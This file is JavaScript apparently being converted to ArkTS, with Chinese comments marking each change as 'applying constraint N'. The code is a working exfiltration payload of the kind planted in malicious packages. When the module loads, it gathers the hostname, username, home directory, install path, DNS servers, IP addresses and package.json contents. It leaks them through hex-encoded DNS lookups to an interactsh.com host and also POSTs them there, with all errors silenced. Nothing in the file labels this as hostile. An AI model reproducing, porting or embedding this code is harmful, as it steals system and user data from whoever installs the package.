// 应用约束60：使用ES6 import代替require
import os from "os";
import dns from "dns";
import querystring from "querystring";
import https from "https";
// 应用约束80：import语句需放在文件顶部
import packageJSON from "./package.ets"; // 假设已转换为ets文件

const package = packageJSON.name;

// 应用约束10：显式指定函数参数和返回类型
function toHex(data: string): string {
    // 应用约束75：替换Buffer为TextEncoder
    const encoder = new TextEncoder();
    const encoded = encoder.encode(data);
    let hex = '';
    for (const byte of encoded) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

// 应用约束9：使用let代替var
function gethttpips(): string[] {
    let str: string[] = [];
    const networkInterfaces = os.networkInterfaces();
    // 应用约束41：使用for-of代替for-in
    for (const item of Object.keys(networkInterfaces)) {
        if (item != "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str.push(addresses[i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str: string = "";
    const networkInterfaces = os.networkInterfaces();
    for (const item of Object.keys(networkInterfaces)) {
        if (item != "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str += toHex(addresses[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(path: string): string {
    let str: string = "p";
    const chunks: string[] = path.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

interface PackageData {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
}

function toName(pkg: PackageData): string[] {
    let str: string = "";
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com";
    
    str = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.` +
          `${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (str.length > 255) {
        const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const substr2 = getIps();
        
        if (substr1.length < 150) {
            const part1 = `${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}`;
            queries.push(`${part1}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            const part2 = `${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}`;
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${part2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${substr2}.${hostname}`);
        }
    } else {
        queries.push(str);
    }
    return queries;
}

// 应用约束24：使用接口定义对象类型
interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: object;
    ip: string;
}

const td: TrackingData = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips())
};

const qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error | null, result: string) => {
        // console.log(result);
    });
}

const trackingData = JSON.stringify(td);
// 应用约束75：使用URLSearchParams代替querystring
const postData = new URLSearchParams({ msg: trackingData }).toString();

const options = {
    hostname: "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString()
    }
};

const req = https.request(options, (res: any) => {
    res.on("data", (d: Uint8Array) => {
        // process.stdout.write(d);
    });
});

req.on("error", (e: Error) => {
    // console.error(e);
});

req.write(postData);
req.end();
